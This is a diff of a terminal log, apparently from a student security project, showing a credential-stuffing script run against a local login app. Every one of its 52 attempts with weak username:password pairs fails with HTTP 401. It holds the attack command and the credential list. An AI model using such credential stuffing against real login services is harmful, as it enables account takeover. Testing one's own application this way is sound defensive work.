@@ -1,10 +1,63 @@
+PS C:\Users\oandr\Documentos computador\t_final_segurança> docker exec -w /proj app_segura python ataque/credential_stuffing.py --url http://host.docker.internal:5001 --creds ataque/creds_vazadas.txt
+
 ================================================================
 ATAQUE DE CREDENTIAL STUFFING
 Alvo        : http://127.0.0.1:5001/login
-Credenciais : 1
-Inicio      : 2026-11-13 17:00:16
+Credenciais : 52
+Inicio      : 2026-11-14 19:02:33
 ================================================================
-[01] alvo:senha123 -> FALHA
+[01] alvo:senha123 -> FALHA (HTTP 401)
+[02] user01:flamengo -> FALHA (HTTP 401)
+[03] user01:000000 -> FALHA (HTTP 401)
+[04] user02:brasil -> FALHA (HTTP 401)
+[05] user02:102030 -> FALHA (HTTP 401)
+[06] user03:dragon -> FALHA (HTTP 401)
+[07] user04:senha123 -> FALHA (HTTP 401)
+[08] user04:mudar123 -> FALHA (HTTP 401)
+[09] user04:dragon -> FALHA (HTTP 401)
+[10] user05:000000 -> FALHA (HTTP 401)
+[11] user06:111111 -> FALHA (HTTP 401)
+[12] user06:qwerty -> FALHA (HTTP 401)
+[13] user07:password -> FALHA (HTTP 401)
+[14] user07:mudar123 -> FALHA (HTTP 401)
+[15] user07:master -> FALHA (HTTP 401)
+[16] user08:mudar123 -> FALHA (HTTP 401)
+[17] user08:dragon -> FALHA (HTTP 401)
+[18] user09:123456 -> FALHA (HTTP 401)
+[19] user09:brasil -> FALHA (HTTP 401)
+[20] user09:qwerty -> FALHA (HTTP 401)
+[21] user10:password -> FALHA (HTTP 401)
+[22] user11:letmein -> FALHA (HTTP 401)
+[23] user12:123456 -> FALHA (HTTP 401)
+[24] user12:000000 -> FALHA (HTTP 401)
+[25] user12:iloveyou -> FALHA (HTTP 401)
+[26] user13:102030 -> FALHA (HTTP 401)
+[27] user13:monkey -> FALHA (HTTP 401)
+[28] user14:letmein -> FALHA (HTTP 401)
+[29] user14:futebol -> FALHA (HTTP 401)
+[30] user14:senha123 -> FALHA (HTTP 401)
+[31] user15:qwerty -> FALHA (HTTP 401)
+[32] user16:senha -> FALHA (HTTP 401)
+[33] user16:sunshine -> FALHA (HTTP 401)
+[34] user17:qwerty -> FALHA (HTTP 401)
+[35] user17:senha -> FALHA (HTTP 401)
+[36] user17:iloveyou -> FALHA (HTTP 401)
+[37] user18:brasil -> FALHA (HTTP 401)
+[38] user19:123456 -> FALHA (HTTP 401)
+[39] user19:qwerty -> FALHA (HTTP 401)
+[40] user20:abc123 -> FALHA (HTTP 401)
+[41] user20:master -> FALHA (HTTP 401)
+[42] user20:abc123 -> FALHA (HTTP 401)
+[43] user21:master -> FALHA (HTTP 401)
+[44] user21:qwerty -> FALHA (HTTP 401)
+[45] user22:123456 -> FALHA (HTTP 401)
+[46] user23:monkey -> FALHA (HTTP 401)
+[47] user24:senha123 -> FALHA (HTTP 401)
+[48] user25:master -> FALHA (HTTP 401)
+[49] user25:sunshine -> FALHA (HTTP 401)
+[50] user23:password -> FALHA (HTTP 401)
+[51] user24:qwerty -> FALHA (HTTP 401)
+[52] user26:123456 -> FALHA (HTTP 401)
 ================================================================
-RESULTADO   : 0 conta(s) comprometida(s) de 1
+RESULTADO   : 0 conta(s) comprometida(s) de 52
 ================================================================
